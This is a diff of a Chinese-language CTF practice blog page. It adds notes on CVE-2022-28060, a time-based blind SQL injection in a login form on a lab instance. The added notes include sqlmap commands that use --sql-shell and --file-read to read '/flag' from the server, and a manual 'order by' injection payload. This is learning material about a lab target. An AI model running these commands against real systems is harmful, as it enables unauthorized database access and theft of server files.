@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1k</span>
+            <span class="post-count">1.3k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">4 分钟</span>
+            <span class="post-count">6 分钟</span>
         </span>
     </span>
 </div>
@@ -167,6 +167,25 @@
 <p>2’–+正常</p>
 <p><code>2&#39; order by 1--+</code></p>
 <p>…</p>
+<h2 id="CVE-2022-28060"><a href="#CVE-2022-28060" class="headerlink" title="CVE-2022-28060"></a>CVE-2022-28060</h2><p>登录框上存在注入；</p>
+<p>不会，看了wp，是时间盲注，我不知道怎么试出来的，看了几个wp都是用了sqlmap扫。</p>
+<p>(emmm，这手工怎么能发现延时注入呢)</p>
+<p><code>python sqlmap.py -u http://eci-2ze6l4gdtbam0rk6gt5e.cloudeci1.ichunqiu.com/includes/login.php</code></p>
+<p>没结果。</p>
+<blockquote>
+<p>–technique:是指定探测技术B:表示布尔盲注,T:表示时间盲注,E:表示报错注入,U:表示联合注入<br>S:表示堆查询注入；利用-v参数指定显示等级，当取最大值等于3时,将显示sqlmap所使用的payload详情<br>-p&#x2F;–skip :指定&#x2F;跳过测试参数</p>
+</blockquote>
+<p>burp post请求可以用sqlmap文本注入，抓包，数据包全选保存为txt文件。</p>
+<p><code>python sqlmap.py -r e:\渗透\111.txt</code></p>
+<p>emmm，运行太久了，放弃。</p>
+<p>将wp粘贴如下：</p>
+<p><code>python sqlmap.py -r 1.txt --sql-shell -v</code></p>
+<p><code>select load_file(&#39;/flag&#39;)</code></p>
+<p>或</p>
+<p><code>sqlmap -r 1.txt --file-read &quot;/flag&quot; --dbms Mysql</code></p>
+<blockquote>
+<p>-r 1.txt：这个选项告诉sqlmap从1.txt这个文件中读取HTTP请求。<br>–file-read “&#x2F;flag”：这个选项让sqlmap尝试从目标数据库服务器上读取”&#x2F;flag”文件。这个行为可能会被视为一种攻击，因为它可能涉及到未经授权的文件访问。<br>–dbms Mysql：这个选项指定了目标数据库的类型是MySQL。</p>
+</blockquote>
 <h1 id="2-任意文件上传漏洞"><a href="#2-任意文件上传漏洞" class="headerlink" title="2.任意文件上传漏洞"></a>2.任意文件上传漏洞</h1><p>php+mysql</p>
 <p>这是个邮箱登录界面，进行了正则匹配。</p>
 <p>但是没有合适的邮箱，错误邮箱提示不存在，bp也没有什么</p>
@@ -176,7 +195,7 @@
 <p>发现页面底部有</p>
 <p>Copyright © 2022 Project Develop by ….可以点击</p>
 <p>在页面随便点点，可以找到作者的邮箱</p>
-<p><a href="mailto:&#x6d;&#97;&#x79;&#x75;&#x72;&#x69;&#46;&#x69;&#110;&#x66;&#x6f;&#x73;&#112;&#97;&#x63;&#101;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#x6d;&#97;&#x79;&#x75;&#x72;&#x69;&#46;&#x69;&#110;&#x66;&#x6f;&#x73;&#112;&#97;&#x63;&#101;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d;</a></p>
+<p><a href="mailto:&#x6d;&#97;&#121;&#117;&#114;&#x69;&#46;&#105;&#x6e;&#x66;&#x6f;&#x73;&#x70;&#x61;&#x63;&#101;&#64;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#109;">&#x6d;&#97;&#121;&#117;&#114;&#x69;&#46;&#105;&#x6e;&#x66;&#x6f;&#x73;&#x70;&#x61;&#x63;&#101;&#64;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#109;</a></p>
 <p>bp构造login&#x3D;0,login&#x3D;1也绕不过去哇</p>
 <p>密码那个跳转连接的名字，可以通过</p>
 <p>进去后的界面，是个药房管理系统，有各种报告。</p>
